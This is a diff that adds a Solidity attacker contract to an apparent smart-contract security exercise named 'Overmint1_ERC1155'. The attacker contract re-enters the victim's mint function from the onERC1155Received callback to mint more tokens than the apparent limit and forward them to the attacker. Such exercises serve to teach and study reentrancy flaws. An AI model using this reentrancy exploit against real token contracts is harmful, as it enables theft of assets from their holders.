@@ -22,3 +22,47 @@ contract Overmint1_ERC1155 is ERC1155 {
         return balanceOf(_attacker, id) == 5;
     }
 }
+
+contract Overmint1_ERC1155Attacker is IERC1155Receiver {
+    Overmint1_ERC1155 victim;
+    address attacker;
+
+    constructor(address _victim) {
+        victim = Overmint1_ERC1155(_victim);
+        attacker = msg.sender;
+    }
+
+    function attack() public {
+        victim.mint(1, "");
+    }
+
+    // Implementation of IERC1155Receiver functions
+    function onERC1155Received(
+        address operator,
+        address from,
+        uint256 id,
+        uint256 value,
+        bytes calldata data
+    ) external returns (bytes4) {
+        if (!victim.success(address(this), id)) {
+            attack();
+        }
+        victim.safeTransferFrom(address(this), attacker, 1, 1, "");
+
+        return IERC1155Receiver.onERC1155Received.selector;
+    }
+
+    function onERC1155BatchReceived(
+        address operator,
+        address from,
+        uint256[] calldata ids,
+        uint256[] calldata values,
+        bytes calldata data
+    ) external returns (bytes4) {
+        return IERC1155Receiver.onERC1155BatchReceived.selector;
+    }
+
+    function supportsInterface(bytes4 interfaceId) public view virtual override(IERC165) returns (bool) {
+        return false;
+    }
+}
